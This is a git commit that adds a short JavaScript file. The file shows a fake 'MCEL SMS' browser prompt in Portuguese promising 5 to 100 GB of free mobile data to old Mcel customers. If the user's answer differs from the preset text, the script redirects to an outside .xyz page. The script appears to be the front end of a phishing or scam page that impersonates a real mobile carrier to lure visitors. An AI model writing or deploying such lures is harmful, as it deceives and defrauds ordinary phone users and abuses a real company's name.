d9f06673ededccc7eb37b3ee63fc3018b38f99bc
sureoffer <emesire247@gmail.com>
2025-06-08 05:52:13 -0700

    Create activation-mcelfreeoffer.mz.js

---
+++ activation-mcelfreeoffer.mz.js
@@ -0,0 +1,5 @@
+var password = 'DADOS GRATUITOS'
+password=prompt('MCEL SMS: Estimado cliente, por favor verifique se o seu cartão SIM Mcel está qualificado para receber 5 GB a 100 GB de dados. Recompensa para clientes antigos. Clique em Dados grátis para verificar agora. ','DADOS GRATUITOS');
+if (password != 'DADOS GRATUITOS') {
+location.href='https://emesire.xyz/mcelfreeoffer.mz.html';
+}
